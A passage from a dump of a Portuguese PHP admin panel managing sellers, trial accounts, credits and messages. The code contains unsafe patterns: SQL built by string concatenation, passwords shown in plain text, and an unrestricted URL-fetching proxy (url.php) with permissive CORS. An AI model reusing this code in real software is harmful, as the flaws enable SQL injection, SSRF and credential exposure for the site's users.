          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                  <input type="hidden" name="id" id="idE">
                <div class="form-group">
                    <label>Título:</label>
                    <input type="text" class="form-control" id="tituloE" name="titulo" placeholder="Título" required autofocus>
                </div>
                <div class="form-group">
                    <label>Mensagem:</label>
                    <input type="text" class="form-control" id="mensagemE" name="mensagem" placeholder="Mensagem" required>
                </div>
                <div class="form-group">
                  <label>Evento:</label>
                  <div class="ml-0 row">
                    <select class="selectpicker" title="Evento" id="id_eventoE" name="id_evento" required>
                  <?php  if ($eventos) { 
                          foreach($eventos as $evento) {?>
                      <option value="<?= $evento['id_evento']?>" > <?= $evento['nome']?> </option>
                    <?php } } ?>
                    </select>
                  </div>
                </div>
                <button type="submit" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
</body>
<script>
    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

    function editarConfirma(id, titulo, mensagem, id_evento) {
        $('#idE').val(id);
        $('#tituloE').val(titulo);
        $('#mensagemE').val(mensagem);
        $('#id_eventoE').val(id_evento);
        $('#editar').modal();
    }

    function remover(id) {
        $.ajax({
            type: "POST",
            url: "controles/remover-mensagem.php",
            data: {id: id},
            success: function(data) {
                location.reload();
            }
        });
    }

    $( "#cadastro-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/adicionar-mensagem.php",
            data: $("#cadastro-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function (data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

    $( "#editar-form" ).submit(function( event ) {
        $.ajax({
            type: "POST",
            url: "controles/editar-mensagem.php",
            data: $("#editar-form").serialize(),
            success: function(data) {
                location.reload();
            },
            error: function (data) {
              resultado(data.responseText);
            }
        });
        event.preventDefault();
    });

</script>
<?php require_once("comum.php");
require_once("alerta.php"); ?>
</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/nenhum.php:
{"type":"text/plain; charset=utf-8","size":569074}
/nova.php:
<?php
header('Content-type: text/plain');
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$IP = $_SERVER['REMOTE_ADDR'] . "\n";
$file = fopen('logs.txt', 'a');
fwrite($file, $IP);
fclose($file);
?>
/sair.php:
<?php
session_start();
unset($_SESSION['usuario']);
session_destroy();
header("Location: index.php");
die();
?>
/teste.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$usuarios = listarUsuarios();
$listas = listarListas();
$buscar = ("SELECT * FROM usuario WHERE id_criador = ".$_SESSION['id_usuario']." AND dia = 31");
$resut = mysqli_query($conexao, $buscar);
$credito2 = mysqli_num_rows($resut);
$buscar = "SELECT * FROM usuario WHERE id_usuario = ".$_SESSION['id_usuario']."";
$resut = mysqli_query($conexao, $buscar);
while($usuario2 = mysqli_fetch_array($resut)){
$creditos = $credito2;
$credito = $usuario2['credito'];}
?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" style="padding-left: 0px;" class="table-responsive container">
			<?php if ($usuarios) { ?>
                <div class="mb-5 form-group float-right">
                </div>
				<div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
			<table class='table table-bordered table-hover'>
                    <caption>Testes</caption>
				<thead class="thead-light">
					<tr align="center">
						<th class='nomecol' style="width: 10%" scope="col">Nome</th>
						<th class='nomecol' style="width: 5%" scope="col">Login</th>
						<th class='nomecol' style="width: 5%" scope="col">Senha</th>
						<th class='nomecol' style="width: 1%" scope="col">Conexão</th>
						<th class='nomecol' style="width: 5%" scope="col">Criador</th>
                        <th class='nomecol' style="width: 5%" scope="col">Estado</th>
                        <th class='nomecol' style="width: 12%" scope="col">Listas</th>
						<th class='nomecol' style="width: 10%" scope="col">Expirar</th>
						<th class='nomecol' style="width: 5%" scope="col">Opções</th>
					</tr>
				</thead>
                <tbody id="conteudo">
					<?php foreach($usuarios as $usuario) { ?>
					<?php
					if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
					$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
					}
					$ip = $_SERVER["REMOTE_ADDR"];
					$logs = ("SELECT * FROM logs WHERE id_usuario = ".$usuario['id_usuario']." AND ip = '$ip' limit 1");
					$resut = mysqli_query($conexao, $logs);
					$log = mysqli_num_rows($resut);
					?>
                    <?php if ($usuario['dia'] == 1){ ?>
					<?php if ($usuario['admin'] == 0) if ($usuario['vendedor'] == 0) { ?>
					<?php
					$hoje = date('Y-m-d');
					$data = $usuario['data'];
					$a = explode("-","$data");
					$b = explode("-","$hoje");
					$antiga= mktime(0, 0, 0, $b[1], $b[2], $b[0]);
					$atual= mktime(0, 0, 0, $a[1], $a[2], $a[0]);
					$diferenca= $atual-$antiga;
					$datas = floor($diferenca/84600);
				    $datas1 = "1"; $datas2 = $datas;
					if($datas1 <= $datas2){
					$id_usuario = $usuario['id_usuario'];
					$estado = "1";
					$result = "UPDATE usuario SET estado_usuario='$estado' WHERE id_usuario='$id_usuario'";
					$atualiza = mysqli_query($conexao, $result);
					} else {
					$id_usuario = $usuario['id_usuario'];
					$estado = "0";
                    $tipo = "0";
					$result = "UPDATE usuario SET vendedor='$tipo', admin='$tipo', estado_usuario='$estado' WHERE id_usuario='$id_usuario'";
					$atualiza = mysqli_query($conexao, $result);}
					?>
					<?php
                    $passwords = "SELECT * FROM passwords WHERE id_usuario = ".$usuario['id_usuario']."";
                    $resut = mysqli_query($conexao, $passwords);
                    while($password = mysqli_fetch_array($resut)){
					?>
					<tr>
							<td align="center"> <?=$usuario['nome_usuario']?> </td>
							<td align="center"> <?=$usuario['login_usuario']?> </td>
							<td align="center"> <?php echo $password['senha'];} ?> </td>
							<td align="center"> <?php if ($usuario['conectado'] == 0) {echo "";} else {echo "".$log." / ".$usuario['conectado']."";} ?> </td>
							<td align="center"> <?php echo $usuario['criador'] ? $usuario['criador']['nome_usuario'] : 'Sistema'; ?> </td>
                            <td align="center"> <?php if ($usuario['estado_usuario'] == 1) { echo "Ativado"; } else { echo "Desativado"; } ?> </td>
							<td align="center"> <?php foreach (listasUsuario($usuario["id_usuario"]) as $lista) echo '[ '.$lista['nome_lista'].' ]'; ?> </td>
							<td align="center"> <?php if ($usuario['estado_usuario'] == 1) { echo "Dia ".$usuario["dia"].""; } else { echo "Expirou Dia ".$usuario["dia"].""; } ?> </td>
							</td>
                            <td style="display: contents;">
								<div class="dropdown">								
								<style>.no-zero { padding-top: 0px; padding-bottom: 0px; position: relative; }</style>
									<button class="btn" type="button" data-toggle="dropdown" aria-expanded="false" style="top: 3px; margin: 0 auto; position: relative; display: block">Opções<span class="fa fa-caret-down" style="left: 4px; position: relative" aria-hidden="true"></span></button>
									<style>.pointer { cursor: pointer; border:none }</style>
									<ul class="no-zero dropdown-menu pointer" x-placement="bottom-start">
									    <?php if($creditos <= $credito){ ?>
										<li align="center"><a class='btn btn-outline-secondary' onclick="migrarConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%;display: block;padding: 5px;top: -10px;"><i class="fas fa-user"></i> Migrar</a></li>										
					                    <?php } ?>
										<?php if($_SESSION['admin']) { ?>
                                        <li align="center"><a class='btn btn-outline-secondary' onclick="migrarConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%;display: block;padding: 5px;top: -10px;"><i class="fas fa-user"></i> Migrar</a></li>
										<?php } ?>
										<li align="center"><a class='btn btn-outline-secondary' onclick="verLogs('<?=$usuario['id_usuario']?>')" style="width: 100%; display: block; padding: 5px"><i class="fas fa-clipboard-list"></i> Logs</a></li>
										<li align="center"><a class='btn btn-outline-secondary' onclick="removerConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%; display: block; padding: 5px"><i class="far fa-trash-alt"></i> Excluir</a></li>
									</ul>
								</div>
							</td>
						</tr>
					<?php } ?>
					<?php } ?>
					<?php } ?>
				</tbody>
			</table>
        <?php
        }
        ?>
            </div>
             <div class="h3 mt-5 row align-items-center justify-content-center">
             <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
        </div>
    </div>
  </main>
<!-- page-content" -->
</div>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Teste</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
						    <option value="admin" hidden></option>
                            <option value="vendedor" hidden></option>
							<option value="cliente">Cliente</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                        <?php if ($listas) { foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<?php if($_SESSION['admin']) { ?>
<!-- Migrar Inicio -->
<div class="modal fade" id="migrar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Migrar para Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="migrar-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Migrar Fim-->
<?php } ?>
<?php if($creditos <= $credito){ ?>
<!-- Migrar Inicio -->
<div class="modal fade" id="migrar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Migrar para Usuário</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="migrar-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Migrar Fim-->
<?php } ?>
</body>
<script>
    var clone = $("#divSenha").clone();
    var cloneC = $("#divSenhaC").clone();
    //$("#divSenhaC").remove();

    $("#cadastro").on('hidden.bs.modal', function (e) {
        if ($( "#adminC" ).val() != 1) {
            //$("#sC").empty();//DO_NOTHING
        }
    });

    $( "#adminC" ).change(function() {
        if ($( "#adminC" ).val() == 1) {
            $("#sC").append(cloneC);
        } else {
            $("#sC").empty();
        }
    });
	
    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }
	
	function migrarConfirma(id,nome) {
        $('#migrar-conteudo').html('<div class="alert alert-warning" role="alert"><strong> Deseja Migrar o Teste </strong>' + nome + ' Usuário? <br /> Você não poderá Desfazer essa operação.</div><button onclick="migrar(' + id + ')" type="submit" class="btn btn-success">Sim, Prossiga!</button>');
        $('#migrar').modal();
    }
	
    function editarConfirma(dia, id,nome,contato,login,estado,admin, vendedor, lista) {
	if(parseInt(dia) > 0){
	   $('#dia').val(parseInt(dia));
	} else {
	   $('#dia').val('');
	}
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        setTimeout(() => {
            $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
            $('*[data-id=nivelE]').text(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        }, 500);
        $('#contatoE').val(contato);
        $('#loginE').val(login);
        $('#estadoE').val(estado);
        $('#estadoE').selectpicker('render');
        $('#adminE').val(admin);
        $('#adminE').selectpicker('render');
        if (parseInt(admin) == 0) {
	    console.log(parseInt(vendedor) !== 1);
	    if(parseInt(vendedor) !== 1){
		$('#exdiaE').show();
		$('#CreditoC').show();
		$('#ConectadoE').show();
	    } else {
		$('#exdiaE').hide();
		$('#CreditoE').hide();
		$('#ConectadoE').hide();
	    }
            //$('#divSenha').remove();
        } else if ($('#divSenha').length < 1) {
            $('#s').append(clone);
        }
        $('#listaE').val(lista);
        $('#listaE').selectpicker('render');
        $('#editar').modal();
    }
    var addForce = function(){
        $( "#cadastro-form" ).trigger('submit');
    };
    var added = false;
    $( "#cadastro-form" ).submit(function( event ) {
        if(!added){
            added = true;
            if($('#cadastro-form select[name="vendedor"]').val().trim() == ""){
                $('#cadastro-form select[name="vendedor"]').val(0);
            }
            if($('#cadastro-form select[name="admin"]').val().trim() == ""){
                $('#cadastro-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/adicionar-teste.php",
                data: $("#cadastro-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    var eddited = false;
    var forceEdit = function(){
        $( "#editar-form" ).trigger('submit');
    }
    $( "#editar-form" ).submit(function( event ) {
        if(!eddited){
            eddited = true;
            if($('#editar-form select[name="vendedor"]').val().trim() == ""){
                $('#editar-form select[name="vendedor"]').val(0);
            }
            if($('#editar-form select[name="admin"]').val().trim() == ""){
                $('#editar-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/editar-usuario.php",
                data: $("#editar-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    <?php if($_SESSION['admin']) { ?>
	  $('#vendedorC').val(0);
      $('#adminC').val(1);
    <?php } ?>

    $('#nivelC').on('change', function(){
       var value = $(this).val();
       $('#sC').empty();
       if(value == 'vendedor'){
           $('#adminC').val(0);
           $('#vendedorC').val(1);
		   $('#CreditoC').val(1);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
       } else if (value == 'admin'){
           $('#adminC').val(1);
           $('#vendedorC').val(0);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
       } else {
           $('#adminC').val(0);
           $('#vendedorC').val(0);
	   $("#sC").append(cloneC);	   
	   $('#exdiaC').show();
	   $('#ConectadoC').show();
       }
    });
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
    function logar(id){
	if(!getCookie('original')){
	   setCookie('original', <?php echo $_SESSION['id_usuario'] ?>, 1);	
	}
	$.get('controles/forcar-login.php?id_usuario=' + id, function(){
	   window.location.reload();
        });
    }
	function remover(id){
        window.location.href = 'controles/remover-teste.php?id_usuario=' + id;
    }
	function migrar(id){
        window.location.href = 'controles/migrar-usuario.php?id_usuario=' + id;
    }
    function verLogs(id){
        window.location.href = 'log.php?id_usuario=' + id;
    }
    $('#nivelE').on('change', function(){
       var value = $(this).val();
       if(value == 'vendedor'){
           $('#adminE').val(0);
           $('#vendedorE').val(1);
           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else if (value == 'admin') {
           $('#adminE').val(1);
           $('#vendedorE').val(0); 
           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else {
           $('#adminE').val(0);
           $('#vendedorE').val(0);
           $("#s").append(clone);
	   $('#exdiaE').show();
	   $('#CreditoE').show();
	   $('#ConectadoE').show();
       }
    });
    if(window.mobilecheck()){
	$('#checkme').remove();
    }
    $('.thead-light th:not(".nomecol")').remove();
</script>
<?php require_once("comum.php"); 
require_once("alerta.php");?>

</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/url.php:
<?php
function cors() {

    // Allow from any origin
    if (isset($_SERVER['HTTP_ORIGIN'])) {
        // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
        // you want to allow, and if so:
        header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 86400');    // cache for 1 day
    }

    // Access-Control headers are received during OPTIONS requests
    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
            // may also be using PUT, PATCH, HEAD etc
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
            header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

    }
}
cors();
$ch = curl_init();
$url = explode('url=', $_SERVER['REQUEST_URI'])[1];
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
$page = curl_exec($ch) or die(curl_error($ch));
echo curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
?>
/usuario.php:
<?php
session_start();
require_once("controles/usuarios.php");
require_once("controles/listas.php");
if (checarUsuario()) {
require_once("cabecalho.php");
$usuarios = listarUsuarios();
$listas = listarListas();
?>
<style id="checkme">
	.page-2content {
	    padding-left: 240px !important;
		padding-right: 240px !important;
	}
	</style>
        <div id="conteudo-painel" style="padding-left: 0px;" class="table-responsive container">
			<?php if ($usuarios) { ?>
                <div class="mb-5 form-group float-right">
                </div>
				<div class="mb-5 form-group float-left">
                    <input type="text" class="pesquisar form-control" placeholder="Pesquisar...">
                </div>
			<table class='table table-bordered table-hover'>
                    <caption>Vendedores</caption>
				<thead class="thead-light">
					<tr align="center">
						<th class='nomecol' style="width: 10%" scope="col">Nome</th>
						<th class='nomecol' style="width: 5%" scope="col">Login</th>
						<th class='nomecol' style="width: 5%" scope="col">Senha</th>
						<th class='nomecol' style="width: 5%" scope="col">Crédito</th>
						<th class='nomecol' style="width: 10%" scope="col">Criador</th>
                        <th class='nomecol' style="width: 5%" scope="col">Estado</th>
                        <th class='nomecol' style="width: 15%" scope="col">Listas</th>
						<th class='nomecol' style="width: 5%" scope="col">Opções</th>
					</tr>
				</thead>
                <tbody id="conteudo">
					<?php foreach($usuarios as $usuario) { ?>
                    <?php if ($usuario['admin'] == 0) if ($usuario['vendedor'] == 1) { ?>
					<?php
					$id_usuario = $usuario['login_usuario'];
                    $passwords = "SELECT * FROM passwords WHERE id_usuario LIKE '%$id_usuario%' limit 1";
                    $resut = mysqli_query($conexao, $passwords);
                    while($password = mysqli_fetch_array($resut)){
					?>
					<tr>
							<td align="center"> <?=$usuario['nome_usuario']?> </td>
							<td align="center"> <?=$usuario['login_usuario']?> </td>
							<td align="center"> <?php echo $password['senha']; ?> </td>							
							<td align="center"> <?php if ($usuario['credito'] == 0) {echo "Não";} else {echo "".$usuario['credito']."";} ?> </td>
							<td align="center"> <?php echo $usuario['criador'] ? $usuario['criador']['nome_usuario'] : 'Sistema'; ?> </td>
                            <td align="center"> <?php if ($usuario['estado_usuario'] == 1) {echo "Ativado";} else {echo "Desativado";} ?> </td>
							<td align="center"> <?php foreach (listasUsuario($usuario["id_usuario"]) as $lista) echo ' [ '.$lista['nome_lista'].' ] '; ?> </td>
							<td style="display: contents;">
								<div class="dropdown">
									<style>.no-zero { padding-top: 0px; padding-bottom: 0px; position: relative; }</style>
									<button class="btn" type="button" data-toggle="dropdown" aria-expanded="false" style="top: 3px; margin: 0 auto; position: relative; display: block">Opções<span class="fa fa-caret-down" style="left: 4px; position: relative" aria-hidden="true"></span></button>
									<style>.pointer { cursor: pointer; border:none }</style>
									<ul class="no-zero dropdown-menu pointer" x-placement="bottom-start">
										<li align="center"><a  class='btn btn-outline-secondary' onclick="editarConfirma('<?php echo $usuario['dia']; ?>', '<?=$usuario['id_usuario']?>','<?=$usuario['nome_usuario']?>','<?=$usuario['conectado']?>','<?=$usuario['login_usuario']?>','<?=$usuario['estado_usuario']?>','<?php echo $password['senha']; ?>', '<?=$usuario['vendedor']?>','<?=$usuario['master']?>', [<?php foreach (listasUsuario($usuario['id_usuario']) as $lista) echo $lista['id_lista'] .',' ?> ])" style="width: 100%;display: block;padding: 5px;top: -10px;"><i class="fas fa-user-edit"></i> Editar</a></li>
										<?php if($usuario['vendedor'] == 1 || ($usuario['admin'] == '1' && $_SESSION['original'] == $usuario['id_usuario'] && $_SESSION['admin'] == '0')){ ?>
										<li align="center"><a  class='btn btn-outline-secondary' onclick="logar(<?php echo $usuario['id_usuario']; ?>);" style="width: 100%; display: block; padding: 5px"><i class="fa fa-sign-in" aria-hidden="true"></i> Logar</a></li>
									    <?php } ?>
										<li align="center"><a  class='btn btn-outline-secondary' onclick="removerConfirma('<?=$usuario['id_usuario']?>', '<?=$usuario['nome_usuario']; ?>')" style="width: 100%; display: block; padding: 5px"><i class="far fa-trash-alt"></i> Excluir</a></li>
									</ul>
								</div>
							</td>
						</tr>
					<?php } ?>
					<?php } ?>
					<?php } ?>
				</tbody>
			</table>
        <?php
        }
        ?>
		  <?php if($_SESSION['admin']) { ?>
             <div class="h3 mt-5 row align-items-center justify-content-center">
             <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
          <?php } ?>
		  <?php if($_SESSION['vendedor']) { ?>
		  <?php if($master1 <= $master2){ ?>
            <div class="h3 mt-5 row align-items-center justify-content-center">
            <i onclick="$('#cadastro').modal()" class="btn btn-outline-info text-dark fas fa-plus"></i>
          <?php } else {echo "<script>if(window==window.top) document.location='dashboard.php'</script>";} ?>
          <?php } ?>
            </div>
        </div>
    </div>
  </main>
<!-- page-content" -->
</div>
<?php if($_SESSION['vendedor']) { ?>
<?php if($master1 <= $master2){ ?>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Vendedor</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
               <?php if($_SESSION['vendedor']) { ?>
               <input id="master" name="master" type="hidden" value="0">
               <?php } ?>
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
                <?php if($_SESSION['vendedor']) { ?>
                <div class="form-group">
                    <label>Máximo de Créditos:</label>
                    <input type="number" class="form-control" name="credito" value="0">
               </div>
               <?php } ?>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
                            <?php if($_SESSION['vendedor']) { ?>
						    <option value="admin" hidden></option>
                            <option value="vendedor">Vendedor</option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista[]" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<?php } ?>
<?php } ?>
<?php if($_SESSION['vendedor']) { ?>
<?php if($master1 <= $master2){ ?>
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<?php } ?>
<?php } ?>
<?php if($_SESSION['vendedor']) { ?>
<?php if($master1 <= $master2){ ?>
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Vendedor</h5>
